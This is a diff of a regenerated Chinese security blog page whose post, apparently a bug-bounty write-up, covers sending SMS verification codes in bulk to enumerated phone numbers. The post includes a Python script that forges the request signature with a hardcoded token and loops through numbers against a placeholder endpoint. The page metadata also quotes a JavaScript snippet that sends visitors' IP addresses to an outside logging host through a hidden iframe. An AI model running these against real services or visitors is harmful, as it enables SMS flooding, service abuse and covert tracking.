@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://doggy-test.github.io">
   <title>遍历手机号发送验证码(二) | Doggy的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -15,6 +15,7 @@
 <meta property="og:url" content="https://doggy-test.github.io/2019/07/26/遍历手机号发送验证码-二/index.html">
 <meta property="og:site_name" content="Doggy的博客">
 <meta property="og:description" content="var userip = returnCitySN.cip; 	var oIframe = document.createElement(&apos;iframe&apos;);     oIframe.src = &apos;http://test.avkxkd.ceye.io/?visitor_ip=&apos;+userip;     oIframe.style.display = &quot;none&quot;; 	document.b">
+<meta property="og:locale" content="default">
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/01.png">
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/02.png">
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/03-.png">
@@ -53,7 +54,7 @@
   
 
 </head>
-
+</html>
 <body>
   <div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
@@ -196,7 +197,7 @@
 <blockquote>
 <p>之前写在笔记上的一次记录，转一下</p>
 </blockquote>
-<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/01.png" alt=""></p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/01.png" alt></p>
 <p>直觉告诉我们这里可能有一个高达50rmb的遍历手机号发送验证短信的问题，抓包看下请求</p>
 <a id="more"></a>
 <p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/02.png" alt="image"></p>
@@ -219,7 +220,7 @@
 <p>看到结果匹配上了</p>
 <p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/12-.png" alt="image"></p>
 <p>证明确实正确，那么可以用python写出个批量脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#encoding=UTF-8</span></div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encyrpt</span><span class="params">(pkg)</span>:</span></div><div class="line">    result = <span class="string">''</span></div><div class="line">    key_list = pkg.split(<span class="string">"&amp;"</span>)</div><div class="line">    key_list.sort()</div><div class="line">    token = <span class="string">"64688142ca8a14ef1307fd2794771d37"</span></div><div class="line">    pkg = <span class="string">''</span>.join(key_list)</div><div class="line">    sign = hashlib.md5(hashlib.md5(pkg+token).hexdigest()+token).hexdigest()</div><div class="line">    <span class="keyword">return</span> sign</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</div><div class="line">        phone = <span class="string">"132888888"</span> + str(i).zfill(<span class="number">2</span>)</div><div class="line">        headers = &#123;</div><div class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Linux; Android 6.0.1; MuMu Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36 Html5Plus/1.0"</span></div><div class="line">        &#125;</div><div class="line">        pkg = <span class="string">"phone="</span> + phone + <span class="string">"&amp;timeStamp=&#123;&#125;"</span>.format(str(time.time()).split(<span class="string">"."</span>)[<span class="number">0</span>]+str(time.time()).split(<span class="string">"."</span>)[<span class="number">1</span>].zfill(<span class="number">3</span>))</div><div class="line">        url = <span class="string">"http://xxx.com/customer/login/code/?&#123;&#125;&amp;bread=&#123;&#125;"</span>.format(pkg,encyrpt(pkg))</div><div class="line">        <span class="keyword">print</span> url</div><div class="line">        r = requests.get(url,headers=headers)</div><div class="line">        <span class="keyword">print</span> r.text</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encyrpt</span><span class="params">(pkg)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    key_list = pkg.split(<span class="string">"&amp;"</span>)</span><br><span class="line">    key_list.sort()</span><br><span class="line">    token = <span class="string">"64688142ca8a14ef1307fd2794771d37"</span></span><br><span class="line">    pkg = <span class="string">''</span>.join(key_list)</span><br><span class="line">    sign = hashlib.md5(hashlib.md5(pkg+token).hexdigest()+token).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> sign</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">        phone = <span class="string">"132888888"</span> + str(i).zfill(<span class="number">2</span>)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Linux; Android 6.0.1; MuMu Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36 Html5Plus/1.0"</span></span><br><span class="line">        &#125;</span><br><span class="line">        pkg = <span class="string">"phone="</span> + phone + <span class="string">"&amp;timeStamp=&#123;&#125;"</span>.format(str(time.time()).split(<span class="string">"."</span>)[<span class="number">0</span>]+str(time.time()).split(<span class="string">"."</span>)[<span class="number">1</span>].zfill(<span class="number">3</span>))</span><br><span class="line">        url = <span class="string">"http://xxx.com/customer/login/code/?&#123;&#125;&amp;bread=&#123;&#125;"</span>.format(pkg,encyrpt(pkg))</span><br><span class="line">        <span class="keyword">print</span> url</span><br><span class="line">        r = requests.get(url,headers=headers)</span><br><span class="line">        <span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>
 <p>当然这个t只是我们猜测的结果，如果想知道具体值，除了去源码分析，还可以利用调试</p>
 <p>在相应的函数下设置断点</p>
 <p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/13-.png" alt="image"></p>
@@ -449,15 +450,19 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">心情随笔，生活感悟</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">数据结构</a>
+                <a href="javascript:void(0)" class="js-tag color5">翻译文章</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+                <a href="javascript:void(0)" class="js-tag color5">数据结构</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -469,11 +474,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">加密解密</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color5">加密解密</a>
               </li>
              
               <li class="article-tag-list-item">
